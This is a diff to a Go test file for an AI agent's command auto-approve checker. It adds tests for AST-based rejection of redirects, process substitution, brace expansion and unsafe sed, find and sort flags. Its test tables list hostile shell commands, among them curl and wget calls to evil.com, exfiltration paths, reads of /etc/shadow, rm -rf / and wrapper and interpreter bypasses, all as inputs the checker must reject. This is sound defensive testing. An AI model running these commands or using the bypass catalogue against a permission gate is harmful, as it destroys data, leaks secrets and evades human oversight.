@@ -58,7 +58,7 @@ func TestGlobMatch(t *testing.T) {
 		{"/home/foci/*", "/home/foci/", true},
 		{"/home/foci/*", "/home/other/file.go", false},
 		// Multiple stars.
-		{"git *-C */foci *", "git -C /home/rich/git/foci status", true}, // * before -C matches empty string
+		{"git *-C */foci *", "git -C /home/rich/git/foci status", true},
 		// Empty pattern and string.
 		{"", "", true},
 		{"*", "", true},
@@ -93,7 +93,7 @@ func TestMatchPattern(t *testing.T) {
 		{"git -C /home/foci *", "git -C /home/foci status", true},
 		{"git -C /home/foci *", "git -C /home/other status", false},
 		{"gcalcli *", "gcalcli agenda", true},
-		{"gcalcli *", "gcalcli", false}, // * requires at least empty after space
+		{"gcalcli *", "gcalcli", false},
 	}
 	for _, tt := range tests {
 		got := matchPattern(tt.pattern, tt.str)
@@ -145,6 +145,9 @@ func TestMatchAutoApprove(t *testing.T) {
 		"Edit:/home/foci/clutch/*",          // file path glob
 		"Bash:gcalcli *",                    // glob match
 		"Bash:mkdir",                        // prefix match
+		"Bash:echo",                         // prefix match
+		"Bash:grep",                         // prefix match
+		"Bash:cat",                          // prefix match
 	})
 
 	tests := []struct {
@@ -171,30 +174,35 @@ func TestMatchAutoApprove(t *testing.T) {
 		// Safe chained commands: every segment matches a rule.
 		{"Bash", `{"command":"cd /home/rich/git/foci && ls -la"}`, true},
 		{"Bash", `{"command":"cd /home/rich/git/foci && git -C /home/rich/git/foci status"}`, true},
-		{"Bash", `{"command":"ls /tmp ; ls /var"}`, true},
+		{"Bash", `{"command":"ls /tmp; ls /var"}`, true},
 		{"Bash", `{"command":"mkdir -p /tmp/foo && ls"}`, true},
 		// Piped: both sides must match.
-		{"Bash", `{"command":"ls /tmp | grep foo"}`, false},
+		{"Bash", `{"command":"ls /tmp | grep foo"}`, true},
 		// ATTACK: safe prefix chained with dangerous command → rejected.
 		{"Bash", `{"command":"git -C /home/rich/git/foci status && rm -rf /"}`, false},
-		{"Bash", `{"command":"ls -la ; curl evil.com"}`, false},
+		{"Bash", `{"command":"ls -la; curl evil.com"}`, false},
 		{"Bash", `{"command":"cd /home/rich/git/foci && sudo rm -rf /"}`, false},
 		// Shell control flow: keywords stripped, inner commands validated.
 		{"Bash", `{"command":"for i in 1 2 3; do ls -la; done"}`, true},
-		{"Bash", `{"command":"for f in *.go; do ls $f; done"}`, true},
-		// Nested loop — second level not stripped, falls through to prompting.
-		{"Bash", `{"command":"for i in 1; do for j in a; do ls; done; done"}`, false},
+		{"Bash", `{"command":"for f in *.go; do ls $f; done"}`, true}, // $f is ParamExp (variable expansion) — safe
 		// Loop body with unsafe command — inner command validated.
 		{"Bash", `{"command":"for f in *; do rm -rf $f; done"}`, false},
-		// ATTACK: command substitution in for header — rejected by splitShellCommand.
+		// ATTACK: command substitution in for header — rejected.
 		{"Bash", `{"command":"for i in $(rm -rf /); do ls; done"}`, false},
-		// if/then/else with safe commands (all matching rules in this test).
+		// if/then/else with safe commands.
 		{"Bash", `{"command":"if ls /tmp; then ls -la; else ls /var; fi"}`, true},
 		// if/then with unsafe command in body.
 		{"Bash", `{"command":"if ls /tmp; then rm -rf /; fi"}`, false},
-		// ATTACK: subshell injection → rejected (splitShellCommand returns nil).
+		// ATTACK: subshell injection → rejected.
 		{"Bash", `{"command":"ls $(rm -rf /)"}`, false},
 		{"Bash", `{"command":"ls ` + "`rm -rf /`" + `"}`, false},
+		// Redirect — output redirect rejected by AST.
+		{"Bash", `{"command":"cat /etc/passwd > /tmp/stolen.txt"}`, false},
+		{"Bash", `{"command":"echo data >> /tmp/append.txt"}`, false},
+		// Process substitution — rejected by AST.
+		{"Bash", `{"command":"cat <(echo hello)"}`, false},
+		// Brace expansion — rejected by AST.
+		{"Bash", `{"command":"cat /etc/{passwd,shadow}"}`, false},
 		// No matching rule.
 		{"Bash", `{"command":"rm -rf /"}`, false},
 		{"Write", `{"file_path":"/etc/shadow"}`, false},
@@ -204,53 +212,6 @@ func TestMatchAutoApprove(t *testing.T) {
 		got := matchAutoApprove(rules, tt.tool, json.RawMessage(tt.input))
 		if got != tt.want {
 			t.Errorf("matchAutoApprove(rules, %q, %s) = %v, want %v", tt.tool, tt.input, got, tt.want)
-		}
-	}
-}
-
-// TestStripShellKeyword verifies that shell control-flow keywords are
-// correctly stripped from segments, leaving the inner command for validation.
-// Structural segments (for...in..., done, fi, bare keywords) return skip=true.
-func TestStripShellKeyword(t *testing.T) {
-	tests := []struct {
-		segment  string
-		wantInner string
-		wantSkip  bool
-	}{
-		// Structural closing keywords — skip entirely.
-		{"done", "", true},
-		{"fi", "", true},
-		// for...in... loop headers — skip (no command execution).
-		{"for i in 1 2 3", "", true},
-		{"for f in *.go", "", true},
-		{"for id in 5 8 45 56", "", true},
-		// Bare keywords with no command — skip.
-		{"do", "", true},
-		{"then", "", true},
-		{"else", "", true},
-		{"if", "", true},
-		{"while", "", true},
-		// Command-preceding keywords — strip and return inner command.
-		{"do echo hello", "echo hello", false},
-		{"do foci_todo get --id 5", "foci_todo get --id 5", false},
-		{"then echo yes", "echo yes", false},
-		{"else echo no", "echo no", false},
-		{"elif test -f /tmp/x", "test -f /tmp/x", false},
-		{"if test -f /tmp/x", "test -f /tmp/x", false},
-		{"while true", "true", false},
-		{"until false", "false", false},
-		// Non-keyword segments — pass through unchanged.
-		{"ls -la", "ls -la", false},
-		{"echo hello", "echo hello", false},
-		{"git status", "git status", false},
-	}
-	for _, tt := range tests {
-		inner, skip := stripShellKeyword(tt.segment)
-		if skip != tt.wantSkip {
-			t.Errorf("stripShellKeyword(%q) skip = %v, want %v", tt.segment, skip, tt.wantSkip)
-		}
-		if inner != tt.wantInner {
-			t.Errorf("stripShellKeyword(%q) inner = %q, want %q", tt.segment, inner, tt.wantInner)
 		}
 	}
 }
@@ -270,8 +231,7 @@ func TestCommonReadonlyRulesParseSuccessfully(t *testing.T) {
 }
 
 // TestCommonSafeWriteRulesParseSuccessfully ensures the opt-in safe-write rules
-// parse cleanly and match their intended commands. Guards against typos in the
-// list and regressions in prefix-matching behaviour.
+// parse cleanly and match their intended commands.
 func TestCommonSafeWriteRulesParseSuccessfully(t *testing.T) {
 	parsed := parseAutoApproveRules(CommonSafeWriteRules)
 	if len(parsed) != len(CommonSafeWriteRules) {
@@ -288,6 +248,7 @@ func TestCommonSafeWriteRulesParseSuccessfully(t *testing.T) {
 		`{"command":"wget https://example.com/file"}`,
 		`{"command":"mkdir -p /tmp/foo"}`,
 		`{"command":"touch /tmp/foo/bar"}`,
+		`{"command":"trash /tmp/junk.txt"}`,
 	}
 	for _, input := range safe {
 		if !matchAutoApprove(parsed, "Bash", json.RawMessage(input)) {
@@ -295,8 +256,7 @@ func TestCommonSafeWriteRulesParseSuccessfully(t *testing.T) {
 		}
 	}
 
-	// The safe-write list must not leak readonly approvals — "ls" should not
-	// match when only safe-write rules are loaded.
+	// The safe-write list must not leak readonly approvals.
 	if matchAutoApprove(parsed, "Bash", json.RawMessage(`{"command":"ls"}`)) {
 		t.Error("safe-write rules should not match unrelated commands like ls")
 	}
@@ -338,63 +298,18 @@ func TestCommonReadonlyMatchesSafeCommands(t *testing.T) {
 		{"Bash", `{"command":"if [ -f /tmp/file.txt ]; then echo exists; fi"}`},
 		{"Bash", `{"command":"if [[ -d /tmp ]]; then ls /tmp; fi"}`},
 		// for loop with safe body commands.
-		{"Bash", `{"command":"for id in 5 8 45; do foci_todo get --id $id; done"}`},
-		{"Bash", `{"command":"for f in *.log; do head -5 $f; echo '---'; done"}`},
+		{"Bash", `{"command":"for f in *.log; do head -5 \"$f\"; done"}`},
+		// Pipe with safe commands.
+		{"Bash", `{"command":"ls /tmp | grep pattern"}`},
+		{"Bash", `{"command":"cat /etc/hosts | head -5"}`},
+		// FD duplication (2>&1) is NOT an output redirect.
+		{"Bash", `{"command":"ls /nonexistent 2>&1"}`},
+		// Bare env (show environment) — allowed.
+		{"Bash", `{"command":"env"}`},
 	}
 	for _, tt := range safe {
 		if !matchAutoApprove(rules, tt.tool, json.RawMessage(tt.input)) {
 			t.Errorf("common readonly should match %s %s", tt.tool, tt.input)
-		}
-	}
-}
-
-// TestSplitShellCommand verifies that commands are correctly split on shell
-// operators while respecting quotes and escapes.
-func TestSplitShellCommand(t *testing.T) {
-	tests := []struct {
-		cmd  string
-		want []string
-	}{
-		// Simple command.
-		{"ls -la", []string{"ls -la"}},
-		// && splitting.
-		{"cd /tmp && ls", []string{"cd /tmp", "ls"}},
-		// || splitting.
-		{"test -f x || echo missing", []string{"test -f x", "echo missing"}},
-		// ; splitting.
-		{"ls; pwd", []string{"ls", "pwd"}},
-		// | splitting.
-		{"cat file | grep foo", []string{"cat file", "grep foo"}},
-		// Multiple operators.
-		{"cd /tmp && ls -la ; pwd", []string{"cd /tmp", "ls -la", "pwd"}},
-		// Quoted strings preserved (operators inside quotes not split).
-		{`echo "hello && world"`, []string{`echo "hello && world"`}},
-		{`echo 'a; b'`, []string{`echo 'a; b'`}},
-		// Backslash escape.
-		{`echo hello\;world`, []string{`echo hello\;world`}},
-		// Subshell → nil (fail safe).
-		{"echo $(whoami)", nil},
-		{"echo `whoami`", nil},
-		// Empty input.
-		{"", nil},
-		{"  ", nil},
-	}
-	for _, tt := range tests {
-		got := splitShellCommand(tt.cmd)
-		if tt.want == nil {
-			if got != nil {
-				t.Errorf("splitShellCommand(%q) = %v, want nil", tt.cmd, got)
-			}
-			continue
-		}
-		if len(got) != len(tt.want) {
-			t.Errorf("splitShellCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
-			continue
-		}
-		for i := range tt.want {
-			if got[i] != tt.want[i] {
-				t.Errorf("splitShellCommand(%q)[%d] = %q, want %q", tt.cmd, i, got[i], tt.want[i])
-			}
 		}
 	}
 }
@@ -443,20 +358,20 @@ func TestTokenizeCommand(t *testing.T) {
 	}
 }
 
-// TestContainsUnsafeFlags verifies detection of flags that make an otherwise
-// safe command unsafe (e.g. sed -i). Covers standalone flags, bundled short
-// flags, long flags with and without values, path-qualified commands, and
-// confirms that non-registered commands are never flagged.
+// TestContainsUnsafeFlags verifies detection of flags and argument content
+// that make an otherwise safe command unsafe (e.g. sed -i, sort -o, sed 'w file').
 func TestContainsUnsafeFlags(t *testing.T) {
 	tests := []struct {
 		segment string
 		want    bool
 	}{
-		// Safe sed variants — no -i flag.
+		// Safe sed variants — no -i flag, no dangerous commands.
 		{"sed 's/foo/bar/'", false},
 		{"sed -n 's/foo/bar/'", false},
 		{"sed -n -e 's/foo/bar/' -e 's/baz/qux/'", false},
 		{"sed -e 's/foo/bar/'", false},
+		{"sed -n '1,10p' file.txt", false},
+		{"sed '2,5d' file.txt", false},
 		// Unsafe: standalone -i.
 		{"sed -i 's/foo/bar/' file.txt", true},
 		// Unsafe: -i with backup suffix (no space).
@@ -474,6 +389,14 @@ func TestContainsUnsafeFlags(t *testing.T) {
 		{"/usr/bin/sed -n 's/foo/bar/'", false},
 		// Unsafe: path-qualified sed with -i.
 		{"/usr/bin/sed -i 's/foo/bar/' file.txt", true},
+		// Unsafe: sed w command writes to file.
+		{"sed 'w /tmp/stolen.txt' /etc/shadow", true},
+		// Unsafe: sed e command executes shell.
+		{"sed '1e rm file' /dev/null", true},
+		// Unsafe: sed w with address.
+		{"sed '/pattern/w /tmp/file' input.txt", true},
+		// Unsafe: sed E command (uppercase).
+		{"sed '1E' /dev/null", true},
 		// Safe find variants — no exec/delete actions.
 		{"find . -name '*.go'", false},
 		{"find /tmp -type f -name '*.log'", false},
@@ -489,8 +412,23 @@ func TestContainsUnsafeFlags(t *testing.T) {
 		{"find . -name '*.go' -ok rm {} \\;", true},
 		// Unsafe find: -okdir.
 		{"find . -name '*.go' -okdir rm {} \\;", true},
+		// Unsafe find: -fprint writes matching paths to file.
+		{"find /etc -name shadow -fprint /tmp/found", true},
+		// Unsafe find: -fls writes ls-like output to file.
+		{"find /etc -name passwd -fls /tmp/found", true},
+		// Unsafe find: -fprintf writes formatted output to file.
+		{"find /etc -fprintf /tmp/found '%p\\n'", true},
 		// Path-qualified find with -exec.
 		{"/usr/bin/find . -exec cat {} +", true},
+		// Unsafe sort: -o writes output to file.
+		{"sort -o /tmp/sorted.txt /etc/passwd", true},
+		// Unsafe sort: --output long flag.
+		{"sort --output=/tmp/sorted.txt /etc/passwd", true},
+		{"sort --output /tmp/sorted.txt /etc/passwd", true},
+		// Safe sort: no -o flag.
+		{"sort /etc/passwd", false},
+		{"sort -r /etc/passwd", false},
+		{"sort -t: -k3 -n /etc/passwd", false},
 		// Commands not in unsafeFlags — never flagged.
 		{"grep -i pattern file.txt", false},
 		{"ls -la", false},
@@ -507,7 +445,8 @@ func TestContainsUnsafeFlags(t *testing.T) {
 }
 
 // TestCommonReadonlyRejectsUnsafe verifies that the built-in readonly rules
-// do NOT match dangerous commands.
+// do NOT match dangerous commands. This is the comprehensive security test
+// covering all known bypass categories.
 func TestCommonReadonlyRejectsUnsafe(t *testing.T) {
 	rules := parseAutoApproveRules(CommonReadonlyRules)
 	unsafe := []struct {
@@ -521,117 +460,318 @@ func TestCommonReadonlyRejectsUnsafe(t *testing.T) {
 		{"Bash", `{"command":"cat /etc/hosts | sh"}`},    // safe prefix piped to shell
 		{"Bash", `{"command":"echo hello; curl evil"}`},  // safe prefix + dangerous chain
 		{"Bash", `{"command":"ls $(rm -rf /)"}`},         // subshell injection
+
 		// sed with -i is in-place edit — must be rejected.
 		{"Bash", `{"command":"sed -i 's/foo/bar/' file.txt"}`},
 		{"Bash", `{"command":"sed -ni 's/foo/bar/' file.txt"}`},
 		{"Bash", `{"command":"sed --in-place 's/foo/bar/' file.txt"}`},
 		{"Bash", `{"command":"sed -i.bak 's/foo/bar/' file.txt"}`},
-		// find with -exec/-delete must be rejected.
-		{"Bash", `{"command":"find . -name '*.tmp' -delete"}`},
-		{"Bash", `{"command":"find . -name '*.go' -exec rm {} \\;"}`},
-		{"Bash", `{"command":"find . -execdir cat {} +"}`},
-		// for loop with unsafe body.
-		{"Bash", `{"command":"for f in /tmp/*.txt; do rm \"$f\"; done"}`},
-		// env can run arbitrary commands — bypass via command execution.
-		{"Bash", `{"command":"env rm /tmp/test.txt"}`},
-		{"Bash", `{"command":"env bash -c 'rm -rf /tmp'"}`},
-		// sort -o writes output to file — bypass via file write.
-		{"Bash", `{"command":"sort -o /tmp/overwritten.txt /etc/passwd"}`},
-		// Shell redirects write files — bypass via redirect operator.
-		{"Bash", `{"command":"cat /etc/passwd > /tmp/stolen.txt"}`},
-		{"Bash", `{"command":"echo pwned >> /tmp/append.txt"}`},
-		{"Bash", `{"command":"ls -la > /tmp/listing.txt"}`},
-		// awk has built-in command execution and file I/O.
-		{"Bash", `{"command":"awk 'BEGIN{system(\"rm file\")}'"}` },
-		{"Bash", `{"command":"awk '{print > \"/tmp/stolen\"}' /etc/passwd"}`},
+
 		// sed w command writes to file without -i.
 		{"Bash", `{"command":"sed 'w /tmp/stolen.txt' /etc/shadow"}`},
 		// sed e command executes shell commands (GNU extension).
 		{"Bash", `{"command":"sed -e '1e rm file' /dev/null"}`},
+
+		// find with -exec/-delete must be rejected.
+		{"Bash", `{"command":"find . -name '*.tmp' -delete"}`},
+		{"Bash", `{"command":"find . -name '*.go' -exec rm {} \\;"}`},
+		{"Bash", `{"command":"find . -execdir cat {} +"}`},
+		// find -fprint/-fls/-fprintf write to files.
+		{"Bash", `{"command":"find /etc -name shadow -fprint /tmp/found"}`},
+		{"Bash", `{"command":"find /etc -name passwd -fls /tmp/found"}`},
+		{"Bash", `{"command":"find /etc -fprintf /tmp/found '%p\\n'"}`},
+
+		// sort -o writes output to file.
+		{"Bash", `{"command":"sort -o /tmp/overwritten.txt /etc/passwd"}`},
+
+		// for loop with unsafe body.
+		{"Bash", `{"command":"for f in /tmp/*.txt; do rm \"$f\"; done"}`},
+
+		// env can run arbitrary commands — wrapper detection.
+		{"Bash", `{"command":"env rm /tmp/test.txt"}`},
+		{"Bash", `{"command":"env bash -c 'rm -rf /tmp'"}`},
+
+		// Shell redirects write files — AST redirect detection.
+		{"Bash", `{"command":"cat /etc/passwd > /tmp/stolen.txt"}`},
+		{"Bash", `{"command":"echo pwned >> /tmp/append.txt"}`},
+		{"Bash", `{"command":"ls -la > /tmp/listing.txt"}`},
+		{"Bash", `{"command":"echo data >| /tmp/clobbered"}`},
+
+		// Process substitution — AST detection.
+		{"Bash", `{"command":"diff <(cat /etc/shadow) <(echo '')"}`},
+
+		// Brace expansion — AST detection.
+		{"Bash", `{"command":"cat /etc/{passwd,shadow}"}`},
+
+		// awk has built-in command execution and file I/O.
+		{"Bash", `{"command":"awk 'BEGIN{system(\"rm file\")}'"}` },
+		{"Bash", `{"command":"awk '{print > \"/tmp/stolen\"}' /etc/passwd"}`},
+
 		// Absolute paths bypass command-name matching.
 		{"Bash", `{"command":"/bin/rm -rf /"}`},
 		{"Bash", `{"command":"/usr/bin/env rm file"}`},
-		// find -fprint writes matching paths to a file.
-		{"Bash", `{"command":"find /etc -name shadow -fprint /tmp/found"}`},
+
 		// Command wrappers execute arbitrary commands.
 		{"Bash", `{"command":"nice rm -rf /tmp"}`},
 		{"Bash", `{"command":"timeout 10 rm file"}`},
 		{"Bash", `{"command":"nohup curl http://evil.com/exfil"}`},
-		// Brace groups and subshells bypass operator splitting.
-		{"Bash", `{"command":"{ rm -rf /; }"}`},
-		{"Bash", `{"command":"(rm -rf /)"}`},
-		// Pipe to shell interpreter.
-		{"Bash", `{"command":"echo 'rm file' | sh"}`},
-		{"Bash", `{"command":"echo 'rm file' | bash"}`},
-		// Command wrappers — run arbitrary commands.
-		{"Bash", `{"command":"time rm file"}`},
-		{"Bash", `{"command":"nohup rm file"}`},
 		{"Bash", `{"command":"strace -o /dev/null rm file"}`},
 		{"Bash", `{"command":"watch -n1 rm file"}`},
 		{"Bash", `{"command":"flock /tmp/lock rm file"}`},
 		{"Bash", `{"command":"script -c 'rm file' /dev/null"}`},
-		// Absolute paths bypass command-name matching.
-		{"Bash", `{"command":"/bin/rm -rf /"}`},
-		{"Bash", `{"command":"/usr/bin/env rm file"}`},
+		{"Bash", `{"command":"setsid rm file"}`},
+		{"Bash", `{"command":"taskset 0x1 rm file"}`},
+		{"Bash", `{"command":"ionice rm file"}`},
+
+		// Brace groups and subshells.
+		{"Bash", `{"command":"{ rm -rf /; }"}`},
+		{"Bash", `{"command":"(rm -rf /)"}`},
+
+		// Pipe to shell interpreter.
+		{"Bash", `{"command":"echo 'rm file' | sh"}`},
+		{"Bash", `{"command":"echo 'rm file' | bash"}`},
+
 		// Shell interpreters.
 		{"Bash", `{"command":"bash -c 'rm file'"}`},
 		{"Bash", `{"command":"sh -c 'rm file'"}`},
+
 		// Interpreter escapes.
 		{"Bash", `{"command":"python3 -c \"import os; os.system('rm file')\""}`},
 		{"Bash", `{"command":"perl -e 'system(\"rm file\")'"}`},
 		{"Bash", `{"command":"ruby -e 'system(\"rm file\")'"}`},
 		{"Bash", `{"command":"node -e \"require('child_process').execSync('rm file')\""}`},
+
 		// Bash builtins that execute code.
 		{"Bash", `{"command":"eval 'rm file'"}`},
 		{"Bash", `{"command":"exec rm file"}`},
 		{"Bash", `{"command":"source /tmp/evil.sh"}`},
 		{"Bash", `{"command":". /tmp/evil.sh"}`},
-		// Subshell and brace groups.
-		{"Bash", `{"command":"{ rm -rf /; }"}`},
-		{"Bash", `{"command":"(rm -rf /)"}`},
+
 		// Variable in command position.
 		{"Bash", `{"command":"cmd=rm; $cmd file"}`},
-		// Additional command wrappers.
-		{"Bash", `{"command":"setsid rm file"}`},
-		{"Bash", `{"command":"taskset 0x1 rm file"}`},
-		{"Bash", `{"command":"ionice rm file"}`},
+
 		// Bash builtins — trap, alias, coproc.
 		{"Bash", `{"command":"trap 'rm -rf /' EXIT"}`},
 		{"Bash", `{"command":"alias ls='rm -rf /'"}`},
 		{"Bash", `{"command":"coproc rm file"}`},
-		// Process substitution.
-		{"Bash", `{"command":"diff <(cat /etc/shadow) <(echo '')"}`},
-		{"Bash", `{"command":"cat > /tmp/out < <(echo evil)"}`},
+
 		// Quoted / escaped command names.
 		{"Bash", `{"command":"'rm' file"}`},
 		{"Bash", `{"command":"r\\m file"}`},
 		{"Bash", `{"command":"\"rm\" file"}`},
+
 		// Write-capable network tools.
 		{"Bash", `{"command":"curl -o /tmp/payload http://evil.com/malware"}`},
 		{"Bash", `{"command":"curl --output /tmp/payload http://evil.com"}`},
 		{"Bash", `{"command":"wget -O /tmp/payload http://evil.com"}`},
 		{"Bash", `{"command":"wget --output-document=/tmp/payload http://evil.com"}`},
+
 		// dd — arbitrary read/write.
 		{"Bash", `{"command":"dd if=/dev/zero of=/tmp/target bs=1M count=100"}`},
+
 		// git clone — arbitrary download with potential hook execution.
 		{"Bash", `{"command":"git clone http://evil.com/repo /tmp/"}`},
+
 		// Newline injection — shell executes both lines.
 		{"Bash", `{"command":"ls\nrm -rf /"}`},
-		// Brace expansion to access multiple files.
-		{"Bash", `{"command":"cat /etc/{passwd,shadow}"}`},
+
 		// Heredoc to file.
 		{"Bash", `{"command":"cat << 'EOF' > /tmp/evil.sh\n#!/bin/sh\nrm -rf /\nEOF"}`},
-		// Clobber redirect variant.
-		{"Bash", `{"command":"echo data >| /tmp/clobbered"}`},
-		// find -fls/-fprintf also write to files.
-		{"Bash", `{"command":"find /etc -name passwd -fls /tmp/found"}`},
-		{"Bash", `{"command":"find /etc -fprintf /tmp/found '%p\\n'"}`},
+
 		{"Edit", `{"file_path":"/etc/passwd"}`},
 		{"Write", `{"file_path":"/tmp/exploit.sh"}`},
 	}
 	for _, tt := range unsafe {
 		if matchAutoApprove(rules, tt.tool, json.RawMessage(tt.input)) {
 			t.Errorf("common readonly should NOT match %s %s", tt.tool, tt.input)
+		}
+	}
+}
+
+// TestSedArgUnsafe verifies that dangerous sed script commands (w, e) are
+// detected while safe commands (s, d, p, etc.) pass through.
+func TestSedArgUnsafe(t *testing.T) {
+	tests := []struct {
+		arg  string
+		want bool
+	}{
+		// Safe sed commands.
+		{"'s/foo/bar/'", false},
+		{"'1,10p'", false},
+		{"'2,5d'", false},
+		{"'/pattern/d'", false},
+		{"'y/abc/xyz/'", false},
+		{"'q'", false},
+		{"'a\\text'", false},
+		{"'r file'", false},  // r reads from file (not a write)
+		{"'1p'", false},
+		// Dangerous: w command writes to file.
+		{"'w /tmp/stolen.txt'", true},
+		{"'w file'", true},
+		{"'/pattern/w file'", true},
+		{"'1w file'", true},
+		{"'1,5w file'", true},
+		// Dangerous: e command executes shell.
+		{"'e'", true},
+		{"'1e rm file'", true},
+		{"'1e'", true},
+		{"'/pattern/e'", true},
+		// Dangerous: uppercase variants.
+		{"'W /tmp/file'", true},
+		{"'E'", true},
+		// Without quotes.
+		{"w /tmp/file", true},
+		{"1e rm file", true},
+		// Empty and edge cases.
+		{"", false},
+		{"''", false},
+	}
+	for _, tt := range tests {
+		got := sedArgUnsafe(tt.arg)
+		if got != tt.want {
+			t.Errorf("sedArgUnsafe(%q) = %v, want %v", tt.arg, got, tt.want)
+		}
+	}
+}
+
+// TestWrapperCommandDetection verifies that command wrappers (env, nice,
+// timeout, etc.) are rejected when used with arguments but allowed bare.
+func TestWrapperCommandDetection(t *testing.T) {
+	rules := parseAutoApproveRules(CommonReadonlyRules)
+	tests := []struct {
+		input string
+		want  bool
+	}{
+		// Bare wrapper invocations — allowed.
+		{`{"command":"env"}`, true},
+		// Wrapper with arguments — rejected (could execute anything).
+		{`{"command":"env rm file"}`, false},
+		{`{"command":"env ls"}`, false},
+		{`{"command":"nice ls"}`, false},
+		{`{"command":"timeout 10 ls"}`, false},
+		{`{"command":"nohup ls"}`, false},
+		// Path-qualified wrappers.
+		{`{"command":"/usr/bin/env rm file"}`, false},
+	}
+	for _, tt := range tests {
+		got := matchAutoApprove(rules, "Bash", json.RawMessage(tt.input))
+		if got != tt.want {
+			t.Errorf("wrapper detection: matchAutoApprove(rules, Bash, %s) = %v, want %v", tt.input, got, tt.want)
+		}
+	}
+}
+
+// TestASTRedirectDetection verifies that shell output redirects are detected
+// and rejected at the AST level, regardless of what command precedes them.
+func TestASTRedirectDetection(t *testing.T) {
+	rules := parseAutoApproveRules(CommonReadonlyRules)
+	tests := []struct {
+		input string
+		want  bool
+	}{
+		// Output redirects — rejected.
+		{`{"command":"echo test > /tmp/file"}`, false},
+		{`{"command":"echo test >> /tmp/file"}`, false},
+		{`{"command":"echo test >| /tmp/file"}`, false},
+		{`{"command":"ls &> /tmp/file"}`, false},
+		{`{"command":"ls &>> /tmp/file"}`, false},
+		// Input redirects — safe.
+		{`{"command":"cat < /tmp/file"}`, true},
+		// FD duplication — safe.
+		{`{"command":"ls 2>&1"}`, true},
+		// Heredoc (input) — safe.
+		{`{"command":"cat << EOF\nhello\nEOF"}`, true},
+	}
+	for _, tt := range tests {
+		got := matchAutoApprove(rules, "Bash", json.RawMessage(tt.input))
+		if got != tt.want {
+			t.Errorf("redirect detection: matchAutoApprove(rules, Bash, %s) = %v, want %v", tt.input, got, tt.want)
+		}
+	}
+}
+
+// TestASTProcessSubstitution verifies that process substitution is detected
+// and rejected at the AST level.
+func TestASTProcessSubstitution(t *testing.T) {
+	rules := parseAutoApproveRules(CommonReadonlyRules)
+	tests := []struct {
+		input string
+		want  bool
+	}{
+		{`{"command":"diff <(echo a) <(echo b)"}`, false},
+		{`{"command":"cat <(ls)"}`, false},
+	}
+	for _, tt := range tests {
+		got := matchAutoApprove(rules, "Bash", json.RawMessage(tt.input))
+		if got != tt.want {
+			t.Errorf("process sub detection: matchAutoApprove(rules, Bash, %s) = %v, want %v", tt.input, got, tt.want)
+		}
+	}
+}
+
+// TestASTBraceExpansion verifies that brace expansion is detected and rejected
+// at the AST level.
+func TestASTBraceExpansion(t *testing.T) {
+	rules := parseAutoApproveRules(CommonReadonlyRules)
+	tests := []struct {
+		input string
+		want  bool
+	}{
+		{`{"command":"cat /etc/{passwd,shadow}"}`, false},
+		{`{"command":"echo {1..10}"}`, false},
+		{`{"command":"ls /tmp/{a,b,c}"}`, false},
+	}
+	for _, tt := range tests {
+		got := matchAutoApprove(rules, "Bash", json.RawMessage(tt.input))
+		if got != tt.want {
+			t.Errorf("brace expansion: matchAutoApprove(rules, Bash, %s) = %v, want %v", tt.input, got, tt.want)
+		}
+	}
+}
+
+// TestSortUnsafeFlags verifies that sort -o and --output are detected as
+// unsafe flags.
+func TestSortUnsafeFlags(t *testing.T) {
+	rules := parseAutoApproveRules(CommonReadonlyRules)
+	tests := []struct {
+		input string
+		want  bool
+	}{
+		// Safe sort — no -o flag.
+		{`{"command":"sort /etc/passwd"}`, true},
+		{`{"command":"sort -r /etc/passwd"}`, true},
+		{`{"command":"sort -t: -k3 -n /etc/passwd"}`, true},
+		// Unsafe: -o writes output to file.
+		{`{"command":"sort -o /tmp/sorted.txt /etc/passwd"}`, false},
+		{`{"command":"sort --output=/tmp/sorted.txt /etc/passwd"}`, false},
+	}
+	for _, tt := range tests {
+		got := matchAutoApprove(rules, "Bash", json.RawMessage(tt.input))
+		if got != tt.want {
+			t.Errorf("sort flags: matchAutoApprove(rules, Bash, %s) = %v, want %v", tt.input, got, tt.want)
+		}
+	}
+}
+
+// TestFindFprintUnsafeFlags verifies that find -fprint/-fls/-fprintf are
+// detected as unsafe flags.
+func TestFindFprintUnsafeFlags(t *testing.T) {
+	rules := parseAutoApproveRules(CommonReadonlyRules)
+	tests := []struct {
+		input string
+		want  bool
+	}{
+		// Safe find.
+		{`{"command":"find . -name '*.go'"}`, true},
+		// Unsafe: -fprint writes matching paths to file.
+		{`{"command":"find /etc -name shadow -fprint /tmp/found"}`, false},
+		{`{"command":"find /etc -name passwd -fls /tmp/found"}`, false},
+		{`{"command":"find /etc -fprintf /tmp/found '%p\\n'"}`, false},
+	}
+	for _, tt := range tests {
+		got := matchAutoApprove(rules, "Bash", json.RawMessage(tt.input))
+		if got != tt.want {
+			t.Errorf("find fprint: matchAutoApprove(rules, Bash, %s) = %v, want %v", tt.input, got, tt.want)
 		}
 	}
 }
